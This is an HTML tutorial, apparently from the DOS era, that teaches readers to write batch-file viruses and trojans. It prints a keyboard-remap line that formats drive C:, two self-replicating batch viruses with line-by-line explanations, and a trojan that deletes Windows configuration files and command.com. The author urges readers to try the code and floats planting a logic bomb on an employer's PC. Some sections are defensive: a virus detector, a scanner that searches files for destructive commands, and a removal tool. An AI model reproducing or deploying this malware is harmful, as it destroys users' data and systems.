@@ -1,0 +1,419 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Simple Batch File Viruses Explained</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<p align="center"><b><font color="#004080" size="+3">Simple - Batch - File - Viruses 
+  - Explained!</font><font color="#004080"><br>
+  <font size="+1">by <a href="mailto:leerumble@aol.com">LINUX_PIR8</a></font></font></b> 
+</p>
+<hr>
+<blockquote>
+  <p> <U><A NAME="Contents"><b>Contents</b></A></U></p>
+  <p><A HREF="#Part01">Part 1: Introduction</A><BR>
+    <A HREF="#Part02">Part 2: Basic commands</A><BR>
+    <A HREF="#Part03">Part 3: Viruses Explained</A><BR>
+    <A HREF="#Part04">Part 4: Simple Batch File Virus</A><BR>
+    <A HREF="#Part05">Part 5: Advanced programming</A><BR>
+    <A HREF="#Part06">Part 6: Programs made in batch</A><BR>
+    <A HREF="#Part07">Part 7: Viral writing groups</A><BR>
+    <A HREF="#Part08">Part 8: Ethics & morality</A><BR>
+    <A HREF="#Part09">Part 9: Trojan story and programming Trojans</A><BR>
+    <A HREF="#Part10">Part 10: Endless loops for fun?</A><BR>
+    <A HREF="#Part11">Part 11: BFV removal</A><BR>
+    <A HREF="#Part12">Part 12: Thankyou and goodnight!</A><BR>
+  </p>
+</blockquote>
+<P>
+<TABLE BORDER="1">
+<TR><TH><P><B><U>(DIS)claimer</U></B></P></TH></TR>
+<TR><TH><P><B>Anything written in this article is strictly for educational purposes only! As you all know, this article presented is exclusively for your enjoyment; any malicious use of this information will be illegal and the accused will be sentenced based on the gravity of the act. I hereby take no responsibility for the reader's actions.</B></P></TH></TR>
+</TABLE>
+<p></P>
+<HR>
+<P><U><A NAME="Part01">Part 1: Introduction</A></U></P>
+<P>This document is written for lamerz in batch language. This explains the true basics of batch file programming. Even experienced programmers could probably learn a thing or to from this document. Now back in the good old days batch files were quite popular among virus writers because of the sheer simplicity of them. But people now days have been guided to Pascal, Delphi and C++. Those mentioned are very good and powerful programming languages but I don't know about you but I think they are boring and hard to cope with. Batch is the language for YOU! Simple to pick up and powerful at the same time. Now if you want to learn batch then keep reading other wise go back to watching Eastenders. Ok people you are the chosen ones.... Continue to the next part.</P>
+<P><A HREF="#Contents">Back to contents</A></P>
+<HR>
+<P><U><A NAME="Part02">Part 2: Basic commands</A></U></P>
+<P>Now there are loads of commands you should already know which are used in DOS. But if you dont know DOS I suggest you go get a book out from your local library and read your ass off because that is the only way to learn.</P>
+<P>Commands listed below I hope you should already know: -</P>
+<PRE>
+Command.com
+Find.exe
+Choice.com
+Attrib.exe
+Mem.exe
+More.com
+Sort.exe
+</PRE>
+<P>Filz you should know about are: -</P>
+<PRE>
+Autoexec.bat (especially this one would help)
+Config.sys
+Msdos.sys
+Tmpdelis.bat
+Dosstart.bat
+win.ini
+System.ini
+</PRE>
+<P>Now filz such as these will help you in your understanding of batch language.</P>
+<P>I will explain what each one does and how it can be used, are you ready...-</P>
+<P>
+<B>Command.com</B> = the command interpreter, dos needs this to function!<BR>
+<B>Find.exe</B> = can be used to search through almost anything for anything! (More on that later)<BR>
+<B>Choice.com</B> = used for menu system functions e.g. a/b/c?<BR>
+<B>Attrib.exe</B> = sets attributes on filz to make them read only or hidden<BR>
+<B>Mem.exe</B> = Tells you about memory resources<BR>
+<B>More.com</B> = More on this later :)<BR>
+<B>Sort.exe</B> = Sorts data (not to sure on this one)<BR>
+<B>Autoexec.bat</B> = start-up file processes functions and drivers needed<BR>
+<B>Config.sys</B> = start-up file processes functions and drivers needed<BR>
+<B>Msdos.sys</B> = same as above but go look in this one, it is interesting, go on play a little.<BR>
+<B>Tmpdelis.bat</B> = is a windows batch file go look inside for more info...<BR>
+<B>Dosstart.bat</B> = windows batch file used for dosprompt to load.<BR>
+<B>Win.ini/system.ini</B> = windows initiation filz play with these and say good by to Winblows 95/98/NT<BR>
+</P>
+<P>Heres some more details about some of the DOS commands:</P>
+<P>
+<B>FIND.EXE</B> = This command is very powerful indeed. Yet to the everyday ignorant user this file means nothing! This file can search through files for specific words, through memory for specific files (tsr's) and through the bios for date, time day etc...
+This means i could if i wanted to see what the date is and if it is my specified date i could make my virus activate. You see where i am coming from now? It is a very powerful tool,  for good and bad! In respect to the good side you could use this program to search through memory to find specific viruses such as the stoned and aircop virus, thus a virus detector!<BR><BR>
+<B>CHOICE.COM</B> = This file is not bad at all. It is for mainly menu systems in batch files, but can be used in other ways if the user wishes to. For instence this program can tell the difference between yes and no. It also has a delay sequence that you can activate, thus using it for timed viruses, e.g. 
+Your Pc is going reset in 10 seconds.<BR>
+
+This is a useful tool in viral programming, because you can get the user to activate the virus, by just pressing a key.<BR><BR>
+
+<B>ANSI.SYS</B> = This file is widley used in BFV's, it has unlimited use. Its main ability is that it can redirect keys to do commands, for example i could program the [a] key to format the hard drive. This is so powerful and dangerous, because it is so easy to do:<BR>
+<PRE>
+Prompt $e[97;"echo Y| format c:/u &gt;nul";13p
+</PRE>
+Just that line could destroy the whole hard drive with out the user knowing.
+To use Ansi.sys it must be loaded into memory through config.sys file.<BR><BR>
+
+<B>ATTRIB.EXE</B> = This file is used in DOS for putting attributes on files making them read-only and/or hidden. Great concealment for bfv's.<BR>
+
+<p></P>
+<P>Each command is some where along the line used in batch filz. But not all the time because they are not needed. For instance a simple batch file below, which asks the user to enter a password, needs no commands just pure batch language.</P>
+<PRE>
+@Echo off
+echo Enter password then [F6] and then smack the [Enter] key real hard!
+prompt $e[30m
+echo on
+echo off
+copy con password.dat&gt;nul
+prompt $e[0m
+echo on
+echo off
+cls
+copy password.set+password.dat password.bat&gt;nul
+call password.bat
+if '%password%=='r3dhat goto done
+echo Incorrect, you are not trying to break into my pc are you?
+choice /t:y,3
+if errorlevel 2 goto next
+:next
+erase password.bat
+erase password.dat
+:hello
+cls
+echo Turn off PC
+goto hello
+:done
+erase password.dat
+erase password.bat
+set password=
+prompt $p$g
+</PRE>
+<P>Simple batch file, which asks the user for a password, and if they type it incorrect then the program will put them in an endless loop! Simple but effective. Other features; are that when typing the password the text colour is set to black so you cant see it then it resets the colour back to normal when finished. Erm...what else? Oh yeah it makes two files puts them together to make another batch file then runs it to set a variable into memory, then the password.bat file will look in memory to check what the user wrote to see if it is correct. Good thinking hey! Well experiment with this one can be interesting. Any bugs or improvements email me at <A HREF="mailto:linuxpir8@yahoo.com">linuxpir8@yahoo.com</A></P>
+<P><A HREF="#Contents">Back to contents</A></P>
+<HR>
+<P><U><A NAME="Part03">Part 3: Viruses Explained</A></U></P>
+<P>Now lets get one thing clear! A virus is not a program that gets on your hard drive by magic and then formats it.</P>
+<P>A virus is a program, made to replicate/copy itself from one file to another. It can not infect files unless you RUN it! Most viruses come off disks or the NET and the user doesn't even realise until his MICROSOFT software decides it doesn't want to work anymore. (I THINK IT MIGHT BE BEST TO MENTION THAT I HATE MICROSOFT AND THE ONLY GOOD THING THAT HAS COME OF THEM IS MSDOS!)</P>
+<P>Now despite my hatred towards Machosoft, i think that most viruses are aimed at Windows/x these days due to the mass numbers that use the O/S. But remember where there is Windows there is MSDOS!!! And where there is msdos there are batch filz and where there are batch filz there are my viruses.</P>
+<P>A simple diagram: -</P>
+<PRE>
+xxxxxxxxxxxxxx     xxxxxxxxxxxxxx
+x Mat156.bat x     x mat156.bat x
+xxxxxxxxxxxxxx     xxxxxxxxxxxxxx
+                   v   virus    v
+                   vvvvvvvvvvvvvv
+^^^^^^^^^^^^^^     ^^^^^^^^^^^^^^
+  uninfected          infected
+</PRE>
+<P>That is the difference between the infected and the uninfected in batch filz.</P>
+<P><A HREF="#Contents">Back to contents</A></P>
+<HR>
+<P><U><A NAME="Part04">Part 4: Simple Batch File Virus</A></U></P>
+<P>Below I'm going to make up a virus then explain how it works. OK here goes....</P>
+<P><B><U>Virus.bat</U></B></P>
+<PRE>
+@echo off
+ctty nul
+for %%f in (*.bat) do copy %%f + virus.bat
+ctty con
+</PRE>
+<P>Thats it, simple infection routine that infects all batch filz in the current directory. This kind of infection is not popular among virus writers due to the way it infects. This virus will not only infect itself, but if it cant find anything to infect it will loop and re-infect all other batch filz all over again until all the memory or system resources are taken up. This is a bug but also a feature. It just appends itself on any batch file, lame but somewhat effective if used in the correct context. Try it out and play with it, as no real damage can occur. Mind you it is very quick, so if you leave it for ten seconds it probably will have infected other batch filz about 600 times. Batch file viruses are very fast. Im am now going to attempt to explain what each line does: -</P>
+<P>
+@echo off - turns off the commands written in the program so the user cannot see what you are typing.<BR>
+ctty nul - disables the keyboard and screen output, meaning you cant stop the virus unless you turn off your PC.<BR>
+for %%f in (*.bat) do copy %%f + virus.bat - this puts the virus in all batch files in the current directory.<BR>
+ctty con - re-enables the keyboard and the screen display.<BR>
+</P>
+<P>Hope fully you understood all that and you are ready to go onto something more advanced.</P>
+<P><A HREF="#Contents">Back to contents</A></P>
+<HR>
+<P><U><A NAME="Part05">Part 5: Advanced programming</A></U></P>
+<P>OK here is the technical stuff. Variables! We set variables so that we can identify stuff. E.g.</P>
+<PRE>
+set virus=*.bat
+</PRE>
+<P>That command means that I can now say virus instead of *.bat. Meaning I can now say infect virus, instead of saying infect *.bat. May seem pointless but in the context that variables are used in it can be very powerful. Below is a virus that uses variables to infect: -</P>
+<PRE>
+@ctty nul.LR
+for %%a in (*.bat) do set LR=%%a
+find "LR"&lt;%LR%
+if errorlevel 1 find "LR&lt;%0&gt;&gt;%LR%
+ctty con.LR
+</PRE>
+<P>This virus uses the variable LR to identify the batch file to infect. Now I will try to explain what this virus is doing in the simplest terms I can, ok you ready? Right this virus will disable the keyboard then search through all the batch filz until it reaches the last one, then it sets the variable LR to the last batch file found, ok so far so good. So now we have a variable assigned to a file. Then it searches through the file for the Key string (variable) LR and if it has it in there it wont infect it again but if it doesn't it will goto the next line. This is where the infection takes place. The virus finds the key string which you should have now guessed is LR which is on every line of the virus and then it finds the letters LR from %0 which is the current file normally the virus, and then gets all the lines with LR on them and inserts them into the file that the variable was assigned to earlier. Finally the virus then enable the keyboard for the user. Badly explained I know but try it out and put 
+a few pause marks in the file and watch what it does! Suprisingly simple. This program is covered more clearly in my article about batch file viruses.</P>
+<P><A HREF="#Contents">Back to contents</A></P>
+<HR>
+<P><U><A NAME="Part06">Part 6: Programs made in batch</A></U></P>
+<P>I have not made that many programs in batch but use your imagination and you can. For example I earlier showed you the password file, I have also made a batch file virus remover, but what I haven't made is a virus detector. My friend at my college gave me the challenge to make a batch file that detects viruses or destructive commands so me and my big mouth took him up on the idea and came up with a lame program.  Searches memory for popular memory resident viruses on a small scale, this could be enlarged to any number of viruses!</P>
+<PRE>
+@echo off
+echo [1] Stoned virus
+echo [2] Aircop virus
+choice /c:12 
+if errorlevel 2 goto aircop
+:stoned
+mem /c|find /i "stoned!" &gt;nul
+if errorlevel 1 goto no_virus
+:virus
+echo Sorry to inform you but you are infected with the stoned virus!
+goto done
+:no_virus
+echo Congratulations man you are clean
+:aircop
+mem /c|find /i "Aircop" &gt;nul
+if error level 1 goto no_virus2
+:virus
+echo You have the Aircop virus.....Unlucky!
+goto done
+:no_virus2
+echo You lucky son of a bitch no virus found!
+:done
+</PRE>
+<P>Very lame technique but if used on a larger scale it works really well and it tells you how much system resources the virus has taken up as well!</P>
+<P>Alrighty then on to the real challenge, searching for destructive commands within BAT, COM, and EXE files.  I did not make this program!! But phuck me it works!</P>
+<PRE>
+@echo off
+if '%2=='Loop goto loop
+echo *** ANSI/BATCH SCANNER ***
+set mask=%1 %2 %3 %4 %5 %6 %7 %8 %9
+if '%mask%==' set mask=*.*
+for %%f in (%mask%) do call %0 %%f Loop
+goto done
+:loop
+if not exist %1 goto done
+set line=
+:: escape and tab characters
+set esc=
+set tab=
+find "%esc%["&lt;%1&gt;nul
+if not errorlevel 1 set line=%line%EscSeq
+find /i "$e["&lt;%1&gt;nul
+if not errorlevel 1 set line=%line%PromptSeq
+find ";13p"&lt;%1&gt;nul
+if not errorlevel 1 set line=%line%KeyRedef
+if '%line%==' goto checkbad
+find """p"&lt;%1&gt;nul
+if not errorlevel 1 set line=%line%Key2
+set hit=0
+find "0p"&lt;%1&gt;nul
+if not errorlevel 1 set hit=1
+find "1p"&lt;%1&gt;nul
+if not errorlevel 1 set hit=1
+find "2p"&lt;%1&gt;nul
+if not errorlevel 1 set hit=1
+find "4p"&lt;%1&gt;nul
+if not errorlevel 1 set hit=1
+find "5p"&lt;%1&gt;nul
+if not errorlevel 1 set hit=1
+find "6p"&lt;%1&gt;nul
+if not errorlevel 1 set hit=1
+find "7p"&lt;%1&gt;nul
+if not errorlevel 1 set hit=1
+find "8p"&lt;%1&gt;nul
+if not errorlevel 1 set hit=1
+find "9p"&lt;%1&gt;nul
+if not errorlevel 1 set hit=1
+if %hit%==1 set line=%line%Key3
+:checkbad
+find /i "DEL "&lt;%1&gt;nul
+if not errorlevel 1 set line=%line%Del
+find /i "DELTREE"&lt;%1&gt;nul
+if not errorlevel 1 set line=%line%Deltree
+find /i "DEBUG"&lt;%1&gt;nul
+if not errorlevel 1 set line=%line%Debug
+find /i "ATTRIB "&lt;%1&gt;nul
+if not errorlevel 1 set line=%line%Attrib
+find /i "FORMAT C:"&lt;%1&gt;nul
+if not errorlevel 1 set line=%line%Format
+find /i "*.BAT"&lt;%1&gt;nul
+if not errorlevel 1 set line=%line%BAT
+find /i "*.EXE"&lt;%1&gt;nul
+if not errorlevel 1 set line=%line%EXE
+find /i "*.COM"&lt;%1&gt;nul
+if not errorlevel 1 set line=%line%COM
+echo %1   %tab%%line%
+:done
+set mask=
+set line=
+set hit=
+set esc=
+set tab=
+</PRE>
+<P><A HREF="#Contents">Back to contents</A></P>
+<HR>
+<P><U><A NAME="Part07">Part 7: Viral writing groups</A></U></P>
+<P>There are plenty of virus writing groups around but they all seem to be in it for fame? People that inspired me where Dark Avenger - who could program any batch file to do any thing!! Hellraiser - who hates Bill gates, but at the same time has some really good ideas, and Lucifer Messiha - who really put the v into virus. These guys dont write anymore but if they did then the viral comunity would be bowing down to them. Viral writing groups are to competetive, they are good at what they do but seem to be complete idiotic adolescents. The time i joined a writing group i thought, oh yeah im good but the reality of it was that i was not writing viruses for fun but i was writing viruses to compete. If you get to the stage that you can program a virus and you want to join a viral group then just remember the fun side of it, do it for yourself. I dont know if you've every heard of Rock Steady, but he wrote loads of viruses (destructive ones) and gave them to John mcaffee pretending he was a victim of this virus.
+ This would then get the virus noticed and the anti virus program makes his virus well known, but at the same time it can be cured. Whta i mean is once you send in a virus the next anti-virus John brings out with have info on Rock Steadys virus. Is it worth it? He is a glory creator! By the way he turns out to be only 15 years old!!! Thats pritty much it on virus writing groups, lets now move on and go to ethics and moral matters concerning viruses.</P>
+<P><A HREF="#Contents">Back to contents</A></P>
+<HR>
+<P><U><A NAME="Part08">Part 8: Ethics &amp; morality</A></U></P>
+<P>OK here is why i am always screwing at people about destructive viruses and trojans. Imagine yourself saving up a whole load of cash, and then buying a new software package. But to your dismay some little **** puts a destructive program on the package and it wipes your whole disk!!! Now if your hard drive contained the amount of valuable data that mine does, i tell ya you'll be pissed! imagine a whole years work from college on it being deleted! See my point. Most people that do make these programs are beginners trying to show off there power, more often than not they are lamerz! Any one can make a program to del all files (erase *), simple stuff. Now the only time destruction pops into my mind is if i get expelled from college or sacked from work i might be tempted to leave a logic bomb on a pc that went off on my bosses birthday or something. But never for nothing, its just not worth it. Alright thats enough of me blabbing on read the rest of this document and enjoy!</P>
+<P><A HREF="#Contents">Back to contents</A></P>
+<HR>
+<P><U><A NAME="Part09">Part 9: Trojan story and programming Trojans</A></U></P>
+<P>It all started off years ago, when two tribes went to war, one tribe lost. This tribe how ever never gave up, they sent a big wooden horse (trojan horse) as a token of there defeat, so when the winning tribe opened there gates and took in the horse the lost tribe jumped out from a secret hatch in the horse and defeated the tribe, thus winning in the end. They only won from concealment. </P>
+<P>Now trojans are destructive programs that are made to look like they do good. Now programming trojans is easy but fooling the user takes the mind of a genius. This is how i would do it. I would make a trojan called setup.bat then i would make ten text filz and rename tham all to .DAT filz and pretend the package is a game. Once they run the setup.bat....BOOM trojan loaded and say goodbye. Programming trojans is easy, but getting caught is even easier. You have to make a trojan that can not only destroy filz but also destroy all traces of itself. Here is my program of how i would do it.</P>
+
+@echo off
+cd\
+if exist c:\windows goto winslows
+if exist c:\dos goto do$
+:poof
+erase *
+goto end_trojan
+:winblows
+cd\windows
+if exist system.ini del system.ini
+if exist win.ini erase win.ini
+ren *.exe *.vxe
+ren *.dat *.cat
+ren *.sys *.sex
+goto end_trojan
+:do$
+cd\dos
+ren *.com *.kom
+ren *.exe *.com
+ren *.kom *.exe
+if exist c:\command.com erase c:\command.com
+:end_trojan
+erase trojan.bat
+
+<P>Extreme basics, but i tell you this would mess up your Windows system for good and Dos would have to be re-installed. Trojans are easy though, so stick to viruses and have PHUN! :)</P>
+<P><A HREF="#Contents">Back to contents</A></P>
+<HR>
+<P><U><A NAME="Part10">Part 10: Endless loops for fun?</A></U></P>
+<P>This bit is lame but what the hey this document is aimed at the lame.(no offence). Here are some simple programs which just loop:-</P>
+<PRE>
+:loop
+dir /s
+goto loop
+</PRE>
+<P>The above displays all the filz on the hard drive and dont stop!</P>
+<PRE>
+:loop
+echo Hello world my name is loopy loo!
+goto loop
+</PRE>
+<P>This one will make the text scroll down the page</P>
+<PRE>
+@echo off
+:poo
+cls
+echo Loopy loo needs a poo!
+pause bell^G^G^G
+goto poo
+</PRE>
+<P>That one beeps in the pc and displays the text.</P>
+<P>ok that should be enough. Read the last bit and then goto bed!</P>
+<P><A HREF="#Contents">Back to contents</A></P>
+<HR>
+<P><U><A NAME="Part11">Part 11: BFV removal</A></U></P>
+<P>These batch viruses work by adding code to the beginning and/or the end of the infected BAT files. The extra code can be removed by loading the infected batch into EDIT and deleting the additional lines. Some will create a hidden copy of themselves in the root (or other directory), use ATTRIB filename -s -r -h followed by DEL filename, filename being the actual name of the virus file. The command DIR /AH /S will show all hidden files on a drive.</P>
+<P>Here is the code for a batch file virus remover:</P>
+<PRE>
+@echo off
+if '%1=='%temp% goto remove
+echo BFV-remover version 1.0
+echo =======================
+echo ÿ
+:start
+echo ************** Batch File Virus Remover ****************
+echo This will remove any batch file virus if used correctly.
+echo BFV-remover will destroy batch files if they do not have
+echo a virus!!! So please read the instructions first.
+echo Made by l33 Rumbl3
+echo ÿ
+set ks=%1
+set is=%2
+if '%ks%==' goto exit
+if '%is%==' set is=%ks%
+if '%temp%==' set temp=C:\
+echo Will remove %ks% from files containing %is%. Proceed?
+choice /c:yn&gt;nul
+if errorlevel 2 goto exit
+for %%v in (*.bat) do call %0 %temp% %%v
+if exist rem$$_ del rem$$_
+goto exit
+:remove
+find "%is%"&lt;%2&gt;nul
+if errorlevel 1 goto done
+echo Found in %2 - remove?
+choice /c:yn&gt;nul
+if errorlevel 2 goto done
+find /v "%ks%"&gt;%2&gt;rem$$_
+copy rem$$_ %2&gt;nul
+goto done
+:exit
+set is=
+set ks=
+:done
+</PRE>
+<P>This program removes viruses that have a unique key, such as the pot virus and the zep virus, although both these viruses do no harm they still are a threat to your data. The major advantage about this program is that it will abstract the virus from the file so that you do not have to delete the file. </P>
+<P>This is for batch file viruses only!! It does not work on COM or EXE files!!</P>
+<P><B>Warning! If key is not unique this will destroy files!</B></P>
+<P>Usage:</P>
+<PRE>
+CLEANBAT Key1 [Key2]
+</PRE>
+<P>...where Key1 is the UNIQUE signature used by the virus and Key2 is an identifying string. If not specified then Key2 is set to Key1</P>
+<P>eg. to kill the skul virus goto DOS and:</P>
+<PRE>
+type: clean skul
+</PRE>
+<P>..and that is it, easy, look in your batch files and see if you have any thing out of the ordinary such as the words infect/vir/a certain date.</P>
+
+<P><A HREF="#Contents">Back to contents</A></P>
+<HR>
+<P><U><A NAME="Part12">Part 12: Thankyou and goodnight!</A></U></P>
+<P>Again cheers for takin your time and reading this heap of ****, i hope it was informative in some kind of way. Well i dont know about you but im knackerd!</P>
+<P>I wrote this in 2 hours designed each program in an hour. Not bad.</P>
+<P>If you want any articles written about anything else then ask because for some wierd reason i enjoy it? Anything related to batch filz, Hacking, cracking, Phreaking (phone hacking) or viruses. I have a massive collection of different viruses from around the world, if you need info on one or have always wanted one ask and i will shove one onto disk for you to play with!</P>
+<P>Just remember that viruses are classed as illegal if used in Britain but they are allowed to be made, as far as i can tell anyways? Dont quote me on that!</P>
+<P>Im going to write a document on one specific virus at a time, telling you how it works, and how to dissassemble it.</P>
+<P><A HREF="#Contents">Back to contents</A></P>
+<P><B>laterz alligatorz</B></P>
+<P><A HREF="mailto:leerumble@aol.com">Linux_Pir8</A> - aka - l33 rumbl3</P>
+<P>mark podogorney is the LONE RANGER!!</P>
+<hr>
+</BODY>
+</HTML>
+
+
+
